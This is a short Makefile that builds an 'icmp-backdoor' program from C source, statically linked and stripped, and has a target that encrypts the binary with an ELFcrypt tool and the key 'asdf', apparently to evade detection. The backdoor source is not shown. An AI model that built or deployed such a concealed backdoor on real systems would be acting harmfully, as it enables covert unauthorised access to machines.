all:
	gcc -static -o icmp-backdoor icmp-backdoor.c
	strip icmp-backdoor

musl:
	musl-gcc -static -o icmp-backdoor-musl icmp-backdoor.c
	strip icmp-backdoor-musl

crypted:
	gcc -o ELFcrypt ELFcrypt.c
	musl-gcc -DELFCRYPT -static -o icmp-backdoor-musl icmp-backdoor.c
	./ELFcrypt -o icmp-backdoor-musl-crypted icmp-backdoor-musl -k asdf
	#strip icmp-backdoor-musl-crypted

clean:
	rm -rf icmp-backdoor icmp-backdoor-musl icmp-backdoor-musl-crypted ELFcrypt *~
